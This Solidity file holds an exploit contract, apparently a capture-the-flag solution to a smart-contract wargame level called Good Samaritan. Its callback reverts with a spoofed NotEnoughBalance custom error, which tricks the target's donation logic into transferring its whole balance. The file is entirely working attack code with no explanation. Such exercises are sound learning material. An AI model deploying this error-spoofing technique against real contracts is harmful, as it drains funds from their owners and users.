// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

contract HackGoodSamaratian {

    error NotEnoughBalance();

    function hack(address _goodSam) public {
        GoodSamaritan(_goodSam).requestDonation();
    }

    function notify(uint256 _amount) external pure {
        if (_amount <= 10) {
                revert NotEnoughBalance();
        }
    }

}

contract GoodSamaritan {
        function requestDonation() external returns(bool enoughBalance){}
}